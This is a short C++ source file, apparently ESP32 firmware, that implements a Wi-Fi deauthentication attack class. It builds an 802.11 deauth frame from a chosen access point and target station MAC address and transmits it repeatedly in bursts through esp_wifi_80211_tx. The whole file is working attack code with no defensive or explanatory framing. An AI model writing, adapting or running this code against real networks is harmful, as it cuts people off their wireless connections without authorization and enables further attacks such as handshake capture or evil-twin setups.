#include "Networks/Attacks/AttackDeauth.h"

const int SEND_PACKET_DELAY = 10;

AttackDeauth::AttackDeauth(const MacAddress& sourceAP, const MacAddress& targetSTA){
    state.status = attack_status_t::Idle;
    state.sourceAP = sourceAP;
    state.targetSTA = targetSTA;

    memcpy(frame.access_point, sourceAP.bytes, 6);
    memcpy(frame.sender, sourceAP.bytes, 6);
    memcpy(frame.station, targetSTA.bytes, 6);
}

void AttackDeauth::start(int times){
    state.status = attack_status_t::Running;

    // unsigned long lastSendTime, now = millis();
    // int i = 0;

    // while (i < times)
    // {
    //     now = millis();
    //     if(now - lastSendTime >= SEND_PACKET_DELAY){
    //         sendDeauthFrame();
    //         Serial.println("Send");
    //         lastSendTime = now;
    //         i++;
    //     }
    // }
    
    for(int i = 0; i < times/100; i++){
        for(int j = 0; j < 100; j++){
            sendDeauthFrame();
            Serial.println("Send");
            delay(1);
        }
        delay(1000);
    }

    state.status = attack_status_t::Completed;
}

attack_status_t AttackDeauth::getStatus(){
    return state.status;
}

void AttackDeauth::sendDeauthFrame(){
    esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
}